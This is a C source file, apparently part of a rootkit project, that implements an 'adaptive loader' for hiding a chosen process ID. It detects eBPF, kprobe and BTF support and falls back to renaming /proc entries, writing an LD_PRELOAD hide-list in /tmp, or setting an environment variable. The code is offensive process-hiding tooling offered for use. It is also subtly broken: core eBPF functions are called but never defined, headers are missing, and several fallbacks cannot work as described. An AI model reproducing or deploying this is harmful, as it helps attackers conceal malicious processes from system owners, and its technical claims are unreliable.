/* =====================================================
 *  Graceful Degradation System
 *  Fallback mechanisms cho các môi trường không tương thích
 * ===================================================== */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <errno.h>

/* Capability levels */
typedef enum {
    CAP_FULL_EBPF = 0,      /* Full eBPF support */
    CAP_LIMITED_EBPF = 1,   /* Limited eBPF (no kprobes) */
    CAP_USERSPACE_ONLY = 2, /* Only LD_PRELOAD */
    CAP_MINIMAL = 3,        /* Basic functionality only */
    CAP_NONE = 4            /* No support */
} capability_level_t;

/* System capabilities */
struct system_capabilities {
    capability_level_t level;
    bool has_bpf_syscall;
    bool has_kprobes;
    bool has_tracepoints;
    bool has_lsm_hooks;
    bool has_override_return;
    bool has_btf;
    char kernel_version[64];
    char arch[32];
    char distro[64];
};

/* Global capability state */
static struct system_capabilities sys_caps = {0};

/* Detect system capabilities */
static int detect_system_capabilities(void) {
    struct utsname uts;
    if (uname(&uts) != 0) {
        perror("uname");
        return -1;
    }
    
    /* Store basic info */
    strncpy(sys_caps.kernel_version, uts.release, sizeof(sys_caps.kernel_version) - 1);
    strncpy(sys_caps.arch, uts.machine, sizeof(sys_caps.arch) - 1);
    
    /* Detect distribution */
    FILE *f = fopen("/etc/os-release", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "ID=", 3) == 0) {
                strncpy(sys_caps.distro, line + 3, sizeof(sys_caps.distro) - 1);
                /* Remove newline */
                char *nl = strchr(sys_caps.distro, '\n');
                if (nl) *nl = '\0';
                break;
            }
        }
        fclose(f);
    }
    
    /* Check BPF syscall support */
    sys_caps.has_bpf_syscall = (access("/proc/sys/kernel/unprivileged_bpf_disabled", F_OK) == 0);
    
    /* Check kprobe support */
    sys_caps.has_kprobes = (access("/sys/kernel/debug/tracing/kprobe_events", F_OK) == 0);
    
    /* Check tracepoint support */
    sys_caps.has_tracepoints = (access("/sys/kernel/debug/tracing/events", F_OK) == 0);
    
    /* Check BTF support */
    sys_caps.has_btf = (access("/sys/kernel/btf/vmlinux", F_OK) == 0);
    
    /* Determine capability level */
    if (sys_caps.has_bpf_syscall && sys_caps.has_kprobes && 
        sys_caps.has_tracepoints && sys_caps.has_btf) {
        sys_caps.level = CAP_FULL_EBPF;
    } else if (sys_caps.has_bpf_syscall && sys_caps.has_tracepoints) {
        sys_caps.level = CAP_LIMITED_EBPF;
    } else {
        sys_caps.level = CAP_USERSPACE_ONLY;
    }
    
    return 0;
}

/* Fallback implementation using procfs manipulation */
static int fallback_procfs_hiding(pid_t pid) {
    char proc_path[256];
    char backup_path[256];
    
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    snprintf(backup_path, sizeof(backup_path), "/tmp/.proc_%d_backup", pid);
    
    /* Simple approach: rename proc directory (requires special permissions) */
    if (rename(proc_path, backup_path) == 0) {
        printf("Fallback: Moved %s to %s\n", proc_path, backup_path);
        return 0;
    }
    
    /* Alternative: Create empty directory to mask real one */
    char mask_path[256];
    snprintf(mask_path, sizeof(mask_path), "/tmp/proc_mask_%d", pid);
    if (mkdir(mask_path, 0755) == 0) {
        printf("Fallback: Created mask directory %s\n", mask_path);
        return 0;
    }
    
    return -1;
}

/* Userspace-only implementation */
static int userspace_only_hiding(pid_t pid) {
    /* Create configuration file for LD_PRELOAD library */
    FILE *config = fopen("/tmp/lsm_hide_config", "a");
    if (!config) {
        perror("fopen config");
        return -1;
    }
    
    fprintf(config, "%d\n", pid);
    fclose(config);
    
    printf("Userspace-only: Added PID %d to config file\n", pid);
    return 0;
}

/* Minimal implementation using environment variables */
static int minimal_hiding(pid_t pid) {
    char env_var[256];
    snprintf(env_var, sizeof(env_var), "HIDDEN_PIDS=%d", pid);
    
    if (putenv(strdup(env_var)) == 0) {
        printf("Minimal: Set environment variable %s\n", env_var);
        return 0;
    }
    
    return -1;
}

/* Main hiding function with fallback logic */
int hide_process_with_fallback(pid_t pid) {
    printf("Attempting to hide PID %d with capability level %d\n", 
           pid, sys_caps.level);
    
    switch (sys_caps.level) {
        case CAP_FULL_EBPF:
            printf("Using full eBPF implementation\n");
            /* Call original eBPF hiding function */
            return hide_process_ebpf(pid);
            
        case CAP_LIMITED_EBPF:
            printf("Using limited eBPF implementation (no kprobes)\n");
            /* Use only tracepoint-based hiding */
            return hide_process_limited_ebpf(pid);
            
        case CAP_USERSPACE_ONLY:
            printf("Falling back to userspace-only implementation\n");
            return userspace_only_hiding(pid);
            
        case CAP_MINIMAL:
            printf("Using minimal implementation\n");
            return minimal_hiding(pid);
            
        case CAP_NONE:
        default:
            printf("No hiding capability available\n");
            return -1;
    }
}

/* Adaptive loader based on system capabilities */
int adaptive_loader_main(int argc, char **argv) {
    /* Detect system capabilities first */
    if (detect_system_capabilities() != 0) {
        fprintf(stderr, "Failed to detect system capabilities\n");
        return 1;
    }
    
    /* Print capability report */
    printf("=== System Capability Report ===\n");
    printf("Kernel: %s\n", sys_caps.kernel_version);
    printf("Architecture: %s\n", sys_caps.arch);
    printf("Distribution: %s\n", sys_caps.distro);
    printf("BPF Syscall: %s\n", sys_caps.has_bpf_syscall ? "Yes" : "No");
    printf("Kprobes: %s\n", sys_caps.has_kprobes ? "Yes" : "No");
    printf("Tracepoints: %s\n", sys_caps.has_tracepoints ? "Yes" : "No");
    printf("BTF: %s\n", sys_caps.has_btf ? "Yes" : "No");
    printf("Capability Level: %d\n", sys_caps.level);
    printf("================================\n\n");
    
    /* Warn about limitations */
    if (sys_caps.level > CAP_FULL_EBPF) {
        printf("WARNING: Running with reduced capabilities.\n");
        printf("Some features may not be available.\n\n");
    }
    
    /* Parse command line arguments */
    if (argc < 2) {
        printf("Usage: %s <pid_to_hide>\n", argv[0]);
        return 1;
    }
    
    pid_t pid = atoi(argv[1]);
    if (pid <= 0) {
        fprintf(stderr, "Invalid PID: %s\n", argv[1]);
        return 1;
    }
    
    /* Attempt to hide process with fallback */
    if (hide_process_with_fallback(pid) == 0) {
        printf("Successfully initiated hiding for PID %d\n", pid);
        return 0;
    } else {
        fprintf(stderr, "Failed to hide PID %d\n", pid);
        return 1;
    }
}

/* Configuration validation */
static int validate_environment(void) {
    /* Check required permissions */
    if (geteuid() != 0) {
        fprintf(stderr, "ERROR: Root privileges required\n");
        return -1;
    }
    
    /* Check kernel version compatibility */
    if (strstr(sys_caps.kernel_version, "3.") || 
        strstr(sys_caps.kernel_version, "4.0") ||
        strstr(sys_caps.kernel_version, "4.1") ||
        strstr(sys_caps.kernel_version, "4.2") ||
        strstr(sys_caps.kernel_version, "4.3")) {
        fprintf(stderr, "WARNING: Kernel %s may have limited support\n", 
                sys_caps.kernel_version);
    }
    
    /* Check architecture support */
    if (strcmp(sys_caps.arch, "x86_64") != 0 && 
        strcmp(sys_caps.arch, "aarch64") != 0) {
        fprintf(stderr, "WARNING: Architecture %s has limited support\n", 
                sys_caps.arch);
    }
    
    return 0;
}

/* Enhanced main with environment validation */
int main(int argc, char **argv) {
    /* Initialize capabilities */
    if (detect_system_capabilities() != 0) {
        return 1;
    }
    
    /* Validate environment */
    if (validate_environment() != 0) {
        return 1;
    }
    
    /* Run adaptive loader */
    return adaptive_loader_main(argc, argv);
}
